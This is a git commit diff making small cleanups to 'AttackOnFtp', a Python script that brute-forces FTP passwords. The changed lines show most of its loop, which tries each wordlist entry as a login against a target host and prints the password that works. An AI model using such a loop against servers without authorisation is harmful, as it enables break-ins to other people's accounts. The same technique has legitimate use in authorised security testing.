85767e5ef63fe97e4297e43e563587d255c5a116
Miguel Galdino <85813276+Miguel-Galdin0@users.noreply.github.com>
2022-03-20 08:15:53 -0300

    a little code cleanup

--- attackonftp.py
+++ attackonftp.py
@@ -19,7 +19,7 @@ def banner():
 
 banner()
 
-#Arguments
+#!Arguments!
 parser = argparse.ArgumentParser(description="AttackOnFtp is a password brute force tool for ftp made with python!")
 parser.add_argument("ip", help="IP to make brute force.")
 parser.add_argument("-u","--user","--username", help="The user of ftp service.", required=True)
@@ -31,12 +31,10 @@ ip = args.ip
 user = args.user
 pass_found = False
 
-
-#TREATING INPUT OF PORTS
+#!TREATING INPUT OF PORTS!
 try:
     if args.port:
-        port = args.port
-        port = int(port)
+        port = int(args.port)
         if port > 65536:
             print("\n\033[31m[-]\033[m Ports must be between 1 and 65536!")
             sys.exit()
@@ -51,24 +49,24 @@ except TypeError:
             print("\n\033[31m[-]\033[m The ports need to be an integer number!")
             sys.exit()
 
-#DATA TIME
+#!DATA TIME!
 print('-' * 50)
 print('|[*] Brute force Target: ' + ip)
 print('|[*] Brute force started at: ' + str(datetime.now()))
 print('-' * 50)
 
-#OPEN WORLIST
+#!OPEN WORLIST!
 try:
     file = open(args.wordlist, "r")
 except (FileNotFoundError, OSError):
     print("\n\033[31m[-]\033[m File not found!")
     sys.exit()
 
-#READ LINES OF WORDLIST
+#!READ LINES OF WORDLIST!
 for line in file.readlines():
         line = line.strip()
         print(f'\n\033[33m[!]\033[m Testing user "{user}" with password "{line}".')
-        #STARTING THE BRUTE FORCE
+        #!STARTING THE BRUTE FORCE!
         try:
             ftp = ftplib.FTP(ip)
             ftp.connect(host=ip, port=port)
@@ -78,6 +76,13 @@ for line in file.readlines():
             print(f'\033[32m[+]\033[m Password is: {line}')
             ftp.quit() 
             break
+            
+        #if password don't work!
+        except ftplib.error_perm:
+            print(f'\033[31m[-]\033[m Invalid password!')
+            pass
+        
+        #!EXCEPTIONS IN CONNECTION ON FTP!
 
         except socket.gaierror:
             print(f'\n\033[31m[-]\033[m Failed to connect in: {ip}')
@@ -88,10 +93,6 @@ for line in file.readlines():
             print(f'\n\033[31m[-]\033[m Failed to connect in: {ip}')
             print('\n\033[31m[-]\033[m Server is not responding!')
             sys.exit()
-
-        except ftplib.error_perm:
-            print(f'\033[31m[-]\033[m Invalid password!')
-            pass
 
         except ConnectionRefusedError:
             print(f'\n\033[31m[-]\033[m Server is not responding!')
@@ -105,5 +106,6 @@ for line in file.readlines():
             print('\n\033[31m[-]\033[m Exiting program!')
             sys.exit()
 
+#if not found the password
 if pass_found != True:
             print(f'\n\033[31m[-]\033[m Password not found for user {user}!')
